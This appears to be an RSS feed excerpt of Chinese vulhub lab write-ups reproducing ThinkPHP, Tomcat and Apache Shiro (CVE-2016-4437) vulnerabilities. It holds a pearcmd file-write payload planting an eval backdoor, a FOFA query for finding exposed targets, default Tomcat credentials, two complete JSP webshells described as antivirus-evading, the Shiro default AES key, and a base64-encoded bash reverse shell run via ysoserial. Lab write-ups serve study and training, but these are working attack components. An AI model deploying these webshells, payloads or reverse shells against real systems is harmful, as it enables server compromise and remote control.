&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();?&amp;gt;+shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png&#34; alt=&#34;image-20240425091852033&#34;&gt;&lt;/p&gt;
&lt;p&gt;传入后门木马，进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();eval($_REQUEST[7]);?&amp;gt;+sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png&#34; alt=&#34;image-20240425091917700&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FOFA搜索语法：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;header&amp;#x3D;”think_lang”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Yeoman92/article/details/53064670&#34;&gt;https://blog.csdn.net/Yeoman92/article/details/53064670&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html&#34;&gt;https://www.freebuf.com/sectool/223149.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_51922767/article/details/126859373&#34;&gt;https://blog.csdn.net/qq_51922767/article/details/126859373&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_42253265/article/details/111593955&#34;&gt;https://blog.csdn.net/weixin_42253265/article/details/111593955&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】Tomcat漏洞复现</title>
            <link>https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Wed, 24 Apr 2024 10:46:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Tomcat漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】Tomcat漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Tomcat漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】Tomcat漏洞复现&lt;/h1&gt;&lt;p&gt;​	Tomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。&lt;/p&gt;
&lt;p&gt;​	Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。&lt;/p&gt;
&lt;h1 id=&#34;Tomcat8&#34;&gt;&lt;a href=&#34;#Tomcat8&#34; class=&#34;headerlink&#34; title=&#34;Tomcat8&#34;&gt;&lt;/a&gt;Tomcat8&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Tomcat7+ 弱口令 &amp;amp;&amp;amp; 后台getshell漏洞&lt;/p&gt;
&lt;p&gt;Tomcat版本：8.0&lt;/p&gt;
&lt;p&gt;环境说明&lt;/p&gt;
&lt;p&gt;Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。&lt;/p&gt;
&lt;p&gt;Tomcat7+权限分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;manager（后台管理）&lt;ul&gt;
&lt;li&gt;manager-gui 拥有html页面权限&lt;/li&gt;
&lt;li&gt;manager-status 拥有查看status的权限&lt;/li&gt;
&lt;li&gt;manager-script 拥有text接口的权限，和status权限&lt;/li&gt;
&lt;li&gt;manager-jmx 拥有jmx权限，和status权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;host-manager（虚拟主机管理）&lt;ul&gt;
&lt;li&gt;admin-gui 拥有html页面权限&lt;/li&gt;
&lt;li&gt;admin-script 拥有text接口权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&amp;#x2F;CSS&amp;#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要准备好恶意代码，要免杀处理后的木马&lt;/p&gt;
&lt;p&gt;如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@page import=&amp;quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&amp;quot;%&amp;gt;&amp;lt;%!class U extends ClassLoader&amp;#123;U(ClassLoader c)&amp;#123;super(c);&amp;#125;public Class g(byte []b)&amp;#123;return super.defineClass(b,0,b.length);&amp;#125;&amp;#125;%&amp;gt;&amp;lt;%if (request.getMethod().equals(&amp;quot;POST&amp;quot;))&amp;#123;String k=&amp;quot;e45e329feb5d925b&amp;quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&amp;quot;u&amp;quot;,k);Cipher c=Cipher.getInstance(&amp;quot;AES&amp;quot;);c.init(2,new SecretKeySpec(k.getBytes(),&amp;quot;AES&amp;quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class U extends ClassLoader &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        U(ClassLoader c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            super(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public Class g(byte[] b) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return super.defineClass(b, 0, b.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public byte[] base64Decode(String str) throws Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Class clazz = Class.forName(&amp;quot;sun.misc.BASE64Decoder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return (byte[]) clazz.getMethod(&amp;quot;decodeBuffer&amp;quot;, String.class).invoke(clazz.newInstance(), str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Class clazz = Class.forName(&amp;quot;java.util.Base64&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Object decoder = clazz.getMethod(&amp;quot;getDecoder&amp;quot;).invoke(null);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return (byte[]) decoder.getClass().getMethod(&amp;quot;decode&amp;quot;, String.class).invoke(decoder, str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String cls = request.getParameter(&amp;quot;passwd&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (cls != null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</guid>
            <title>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</title>
            <link>https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 18 Apr 2024 23:31:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;a href=&#34;#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;/a&gt;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&lt;/h1&gt;&lt;p&gt;​	Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。&lt;/p&gt;
&lt;p&gt;​	Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，可以直接反序列化执行恶意代码。&lt;/strong&gt;而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;具体流程&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。&lt;/p&gt;
&lt;p&gt;如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。&lt;/p&gt;
&lt;p&gt;加密的过程是：用户信息&amp;#x3D;&amp;gt;序列化&amp;#x3D;&amp;gt;AES加密（密钥key）&amp;#x3D;&amp;gt;base64编码&amp;#x3D;&amp;gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &amp;#x3D;&amp;gt; Base64解码&amp;#x3D;&amp;gt;AES解密（密钥key）&amp;#x3D;&amp;gt;反序列化。&lt;/p&gt;
&lt;p&gt;攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png&#34; alt=&#34;屏幕截图 2024-04-18 003118&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;影响版本&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro &amp;lt;&amp;#x3D;1.2.4&lt;/p&gt;
&lt;p&gt;&lt;code&gt;shiro特征&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。&lt;/p&gt;
&lt;p&gt;判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&amp;#x3D;deleteMe字段。&lt;/p&gt;
&lt;p&gt;如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&amp;#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png&#34; alt=&#34;屏幕截图 2024-04-17 234618&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a href=&#34;#漏洞验证&#34; class=&#34;headerlink&#34; title=&#34;漏洞验证&#34;&gt;&lt;/a&gt;漏洞验证&lt;/h2&gt;&lt;p&gt;利用脚本或工具进行验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -u http://192.168.100.134:8080&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png&#34; alt=&#34;image-20240418163349162&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png&#34; alt=&#34;image-20240418163332946&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png&#34; alt=&#34;image-20240418163611522&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，说明漏洞存在。&lt;/p&gt;
&lt;p&gt;利用dnslog或collaborator进一步验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png&#34; alt=&#34;image-20240418185442068&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;目标任务：构造cookie获取反弹shell&lt;/p&gt;
&lt;p&gt;nc开启监听，nc -lvvp 6666&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png&#34; alt=&#34;image-20240418170744863&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造反弹shell的命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/6666 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令中包含重定向 ’ &amp;lt; ’ ’ &amp;gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;利用序列化工具ysoserial.jar生成payload，并配置监听功能&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.200.131&amp;#x2F;6666 0&amp;gt;&amp;amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。&lt;/p&gt;
